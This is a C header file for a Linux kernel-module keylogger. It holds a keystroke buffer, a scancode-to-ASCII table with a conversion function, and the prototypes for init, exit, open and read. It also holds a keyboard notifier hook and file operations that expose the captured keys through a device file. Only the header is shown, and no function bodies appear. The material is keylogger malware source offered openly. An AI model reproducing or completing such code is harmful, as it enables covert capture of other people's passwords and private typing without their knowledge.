#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/fs.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#define BUFFER_SIZE 1024
#define FIRST_CD KEY_1
#define LAST_CD KEY_SLASH

char buffer[BUFFER_SIZE + 1];
char* buffer_pointer = buffer;
const char* end_pointer = (buffer + sizeof(buffer) - 1);

const char character_table[] = {
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r', '\t', 
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', 'X', 
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X', 'X', '\\', 
    'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
};

/* ==============================
   Return ASCII code
   ============================== */
inline char get_ascii(int code) {
    if((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) {
        return 'X';
    } else if (code == KEY_SPACE) {
        return ' ';
    }
    return character_table[(code-FIRST_CD)];
}

/* ==============================
   Function prototypes
   ============================== */
static int keylogger_init(void);
static void keylogger_exit(void);
static int keylogger_open(struct inode *inode, struct file *filep);
static ssize_t keylogger_read(struct file *filep, char __user *buff, size_t len, loff_t *offset);
static int keylogger_notifier(struct notifier_block* nblock, unsigned long code, void* _param);

/* ==============================
   Callbacks
   ============================== */
struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keylogger_read,
    .open = keylogger_open
};

struct notifier_block nb = {
    .notifier_call = keylogger_notifier
};

#endif
